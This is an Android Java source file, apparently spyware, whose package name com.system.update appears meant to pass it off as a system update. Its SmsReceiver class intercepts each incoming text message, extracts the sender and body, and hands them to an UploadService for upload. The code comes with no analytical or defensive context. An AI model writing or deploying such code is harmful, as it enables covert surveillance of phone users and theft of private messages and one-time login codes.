package com.system.update;

import android.content.*;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null) return;

        String format = bundle.getString("format");

        for (Object pdu : pdus) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu, format);
            if (sms != null) {
                String from = sms.getOriginatingAddress();
                String body = sms.getMessageBody();
                UploadService.uploadRecord(ctx, "SMS", from, body);
            }
        }
    }
}
